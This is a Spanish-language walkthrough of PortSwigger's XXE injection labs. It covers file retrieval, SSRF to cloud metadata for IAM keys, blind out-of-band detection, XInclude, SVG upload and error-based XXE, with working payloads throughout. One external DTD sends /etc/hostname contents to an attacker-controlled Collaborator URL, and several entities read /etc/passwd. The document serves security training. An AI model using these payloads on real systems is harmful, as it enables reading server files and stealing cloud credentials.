# XML external entity (XXE) injection

## Lab: Exploiting XXE using external entities to retrieve files

### Enunciado

Este laboratorio tiene una funcionalidad de **"Check stock"** que **analiza entradas XML** y devuelve cualquier valor inesperado en la respuesta. **Inyectar una entidad externa XML (XXE)** para **recuperar el contenido del archivo `/etc/passwd`**.

### Resolución

Accedemos a la petición tras comprobar el stock y la mandamos al **Repeater**.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Tiene contenido en **XML** que vamos a cambiar. Vamos a poner una etiqueta ya que no comprueba este tipo de inyección.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Cambiamos el contenido para que se nos imprima el **/etc/passwd**.

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Lab: Exploiting XXE to perform SSRF attacks

### Enunciado

Este laboratorio tiene una funcionalidad de **"Check stock"** que **analiza entradas XML** y devuelve cualquier valor inesperado en la respuesta.

El servidor del laboratorio está ejecutando un **endpoint simulado de metadatos EC2** en la URL por defecto:\
&#xNAN;**`http://169.254.169.254/`**\
Este endpoint puede usarse para obtener información sobre la instancia, incluyendo **datos sensibles**. **Explotar la vulnerabilidad XXE para realizar un ataque SSRF** y obtener la **clave secreta de acceso (secret access key) del IAM** desde el endpoint de metadatos EC2.

### Resolución

Comprobamos lo del anterior laboratorio si se puede inyectar código XML.

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Sí se puede por lo que ahora lo modificamos así.

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Al enviarlo nos devuelve latest que puede ser un directorio en el que vamos a ir indagando hasta encontrar las credenciales.

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Y así todo el rato hasta las credenciales.

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Lab: Blind XXE with out-of-band interaction

### Enunciado

Este laboratorio tiene una funcionalidad de "Check stock" que analiza entradas XML pero no muestra el resultado. Puedes detectar la vulnerabilidad XXE a ciegas provocando interacciones _out-of-band_ con un dominio externo.

> Usa una entidad externa (external entity) para que el analizador XML realice una consulta DNS y una solicitud HTTP a Burp Collaborator.

### Resolución

Interceptamos la petición del stock.  A menudo puedes **detectar XXE a ciegas** usando la misma técnica que en ataques XXE SSRF, provocando una interacción de red _out-of-band_ hacia un sistema que tú controles.

Por ejemplo, puedes definir una **entidad externa** así:

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://ID.web-attacker.com"> ]>
```

Luego usas esa entidad en un valor dentro del XML.

**¿Qué hace este ataque XXE?**

* Obliga al servidor a realizar una solicitud HTTP de back-end a la URL especificada.
* El atacante puede monitorizar la consulta DNS y la solicitud HTTP resultante para confirmar que la inyección XXE funcionó.

Sabiendo esto vamos a Burp Suite's Collaborator y copia tu payload personalizado para usarlo en el ataque y detectar la XXE a ciegas.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-08 215516 (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-08 215611.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-08 215634 (1).png" alt=""><figcaption></figcaption></figure>

## Lab: Blind XXE with out-of-band interaction via XML parameter entities

### Enunciado

Este laboratorio tiene una funcionalidad de "Check stock" que analiza entradas XML, pero no muestra valores inesperados y bloquea las solicitudes que contienen entidades externas normales.

Usa una _parameter entity_ para hacer que el analizador XML realice una consulta DNS y una solicitud HTTP a Burp Collaborator.

### Resolución

A menudo puedes **detectar XXE a ciegas** usando la misma técnica que para ataques XXE SSRF, provocando una interacción de red _out-of-band_ hacia un sistema que controles.

Por ejemplo, puedes definir una **entidad externa** así:

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://ID.web-attacker.com"> ]>
```

Luego, usarías esa **entidad** en un valor de datos dentro del XML.

**¿Qué efecto tiene este ataque XXE?**

* Obliga al servidor a hacer una **solicitud HTTP de back-end** a la URL especificada.
* El atacante puede **monitorizar** la consulta DNS y la solicitud HTTP resultante para **confirmar que la inyección XXE fue exitosa**.

Sabiendo esto vamos a **Burp Suite's Collaborator** y copia el payload generado para usarlo en tu ataque y así detectar la XXE a ciegas.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-08 221213.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-08 221142.png" alt=""><figcaption></figcaption></figure>

## Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD

### Enunciado

Este laboratorio tiene una funcionalidad de "Check stock" que analiza entradas XML pero no muestra el resultado. Exfiltra el contenido del archivo `/etc/hostname`.

> Para evitar que la plataforma Academy se use para atacar a terceros, su firewall bloquea interacciones con sistemas externos arbitrarios. Para resolver el laboratorio, debes usar el servidor de explotación proporcionado y/o el servidor público por defecto de Burp Collaborator.

### Resolución

Miramos la petición del stock.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-09 182655.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-09 182741.png" alt=""><figcaption></figcaption></figure>

Primero debemos subir un archivo DTD externo que defina entidades para:

* Leer el contenido de `/etc/hostname` en el servidor vulnerable.
* Enviar esa información de vuelta a tu servidor o a Burp Collaborator.

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://TU-COLLABORATOR/?x=%file;'>">
%eval;
%exfil;
```

Cuando subamos ese archivo al exploit server, copia la URL pública generada. Por ejemplo:

```
https://exploit-...exploit-server.net/exploit
```

En la función de “check stock” de la aplicación vulnerable, debemos enviar un cuerpo XML como el siguiente, reemplazando "YOUR-EXPLOIT-URL" con la URL real de tu exploit:

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-EXPLOIT-URL"> %xxe;]>
<stockCheck>
  <productId>2</productId>
  <storeId>1</storeId>
</stockCheck>
```

Finalmente, abrimos Burp Collaborator o revisa tu servidor para ver la petición recibida. En ella se incluirá el contenido del archivo `/etc/hostname` del servidor vulnerable.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-09 190702.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-09 190733.png" alt=""><figcaption></figcaption></figure>

## Lab: Exploiting blind XXE to retrieve data via error messages

### Enunciado

Este laboratorio tiene una función "Check stock" que analiza (parsea) entradas en formato XML pero no muestra el resultado.

Para resolver el laboratorio, utiliza un DTD externo para provocar un mensaje de error que muestre el contenido del archivo /etc/passwd.

El laboratorio incluye un enlace a un servidor de explotación (exploit server) en un dominio diferente, donde puedes alojar tu DTD malicioso.

### Resolución

Vemos la petición de stock.

<figure><img src="../../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Como no sale el error estamos en una inyección a ciegas XXE. Para explotar esto, podemos provocar un error de análisis XML, de manera que el mensaje de error incluya datos sensibles, como el contenido de **/etc/passwd**.

En el laboratorio, contamos con un servidor de explotación (exploit server) que nos permite alojar un DTD externo malicioso

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a84005704bd670e808b5c9b0112003d.exploit-server.net/exploit"> %xxe;]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Lab: Exploiting XInclude to retrieve files

### Enunciado

Este laboratorio tiene una función “Check stock” que inserta la entrada del usuario dentro de un documento XML en el servidor y luego la analiza. Como no controlas todo el documento XML, no puedes definir un DTD para hacer un ataque XXE clásico.

Para resolver el laboratorio, inyecta una instrucción XInclude para obtener el contenido del archivo /etc/passwd.

### Resolución

Vemos la petición de stock.

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Esta vez, sin embargo, no vemos ningún dato XML. En algunas aplicaciones, los datos enviados por el cliente se reciben y se insertan en el servidor dentro de un documento XML, que luego se analiza.

Si la entrada del usuario no se sanitiza bien, puede ser vulnerable a inyección XXE usando XInclude.

XInclude es parte de la especificación XML que permite construir un documento XML a partir de subdocumentos. Podemos colocar un ataque de XInclude en cualquier valor de datos en un documento XML, por lo que se puede realizar incluso cuando solo controlas un dato individual que se inserta en el XML del servidor.

Para realizar un ataque XInclude, necesitas referenciar el namespace de XInclude y dar la ruta al archivo que quieres incluir. Por ejemplo:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

Con esta información, podemos enviar el siguiente payload:

```
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Lab: Exploiting XXE via image file upload

### Enunciado

Este laboratorio permite a los usuarios adjuntar avatares a los comentarios y usa la biblioteca Apache Batik para procesar los archivos de imagen del avatar.

Para resolver el laboratorio, sube una imagen que, al ser procesada, muestre el contenido del archivo `/etc/hostname`.

Luego, usa el botón "Submit solution" para enviar el valor del nombre del host del servidor.

### Resolución

En la sección de comentarios podemos subir un avatar. El enunciado indica que se usa la biblioteca Apache Batik para procesar archivos de imagen del avatar. Esto sugiere que podemos subir una imagen SVG, que es un formato basado en XML y vulnerable a XXE.

Con esta información, podemos crear un archivo SVG con un payload XXE para extraer datos del servidor.

{% embed url="https://insinuator.net/2015/03/xxe-injection-in-apache-batik-library-cve-2015-0250/" %}

```
<?xml version="1.0" standalone="yes"?><!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-family="Verdana" font-size="16" x="0" y="16">&xxe;</text></svg>
```

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Abrimos la imagen en una nueva ventana.

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1570).png" alt=""><figcaption></figcaption></figure>
